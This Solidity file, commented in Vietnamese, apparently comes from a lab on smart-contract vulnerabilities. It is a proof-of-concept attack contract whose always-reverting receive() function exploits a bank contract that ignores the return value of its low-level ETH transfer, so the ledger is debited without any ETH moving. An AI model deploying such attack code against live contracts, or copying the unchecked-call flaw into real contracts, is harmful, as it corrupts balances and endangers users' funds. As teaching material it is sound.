// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SC06_VulnerableBank.sol";

// Hợp đồng Attack đóng vai trò "bên ngoài" mà Bank gọi tới.
// Nó cố tình REVERT khi nhận ETH, làm cho Bank nghĩ đã rút tiền
// nhưng thực tế không chuyển được, tạo ra trạng thái sai.
contract SC06_Attack {
    SC06_VulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = SC06_VulnerableBank(_bank);
        owner = msg.sender;
    }

    // Người dùng gửi ETH vào đây, Attack forward vào Bank
    // => trong Bank, người có số dư là SC06_Attack (address của contract này)
    function depositToBank() external payable {
        bank.deposit{value: msg.value}();
    }

    // Hàm tấn công: yêu cầu Bank rút tiền cho SC06_Attack
    // nhưng khi Bank gửi ETH về, receive() phía dưới sẽ REVERT
    // -> .call trong Bank trả về success = false nhưng Bank KHÔNG check
    // -> balances[SC06_Attack] vẫn bị trừ dù không nhận được ETH
    function attackWithdraw(uint256 amount) external {
        bank.withdraw(amount);
    }

    // Ngăn không cho nhận ETH: mọi attempt gửi ETH tới Attack đều fail
    receive() external payable {
        revert("I refuse to receive ETH");
    }
}
